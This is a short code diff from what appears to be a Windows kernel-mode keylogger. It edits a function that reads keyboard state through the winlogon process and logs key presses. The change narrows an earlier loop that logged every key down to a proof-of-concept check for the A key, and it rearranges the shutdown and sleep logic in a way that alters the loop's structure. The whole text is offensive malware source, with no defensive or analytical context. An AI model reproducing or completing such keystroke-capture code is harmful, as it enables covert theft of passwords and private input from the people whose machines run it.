@@ -455,26 +455,22 @@ BeKeyLoggerFunction(IN PVOID StartContext)
 		{
 			BeUpdateKeyStateMap(BeGlobals::winLogonPid, gasAsyncKeyStateAddr);
 
-			// POC: just check for A. TODO: log all keys
-            for (UINT8 i = 0; i < 256; ++i)
+            // Just a poc :)
+            if (BeWasKeyPressed(VK_KEY_A))
             {
-                if (BeWasKeyPressed(i))
-                {
-                    LOG_MSG("%s pressed\n", BeVkToChar(i));
-                }
+                LOG_MSG("A key pressed\n");
             }
-		}
-		
-		if (BeGlobals::shutdown)
-		{
-            KeSetEvent(&BeGlobals::hKeyLoggerTerminationEvent, IO_NO_INCREMENT, FALSE);
-			PsTerminateSystemThread(STATUS_SUCCESS);
-		}
-
-		// Sleep for 0.05 seconds
-		LARGE_INTEGER interval;
-		interval.QuadPart = -1 * (LONGLONG)50 * 10000;
-		KeDelayExecutionThread(KernelMode, FALSE, &interval);
+        }
 	}
+		
+	if (BeGlobals::shutdown)
+	{
+        KeSetEvent(&BeGlobals::hKeyLoggerTerminationEvent, IO_NO_INCREMENT, FALSE);
+		PsTerminateSystemThread(STATUS_SUCCESS);
+	}
+
+	// Sleep for 0.05 seconds
+	LARGE_INTEGER interval;
+	interval.QuadPart = -1 * (LONGLONG)50 * 10000;
+	KeDelayExecutionThread(KernelMode, FALSE, &interval);
 }
- 
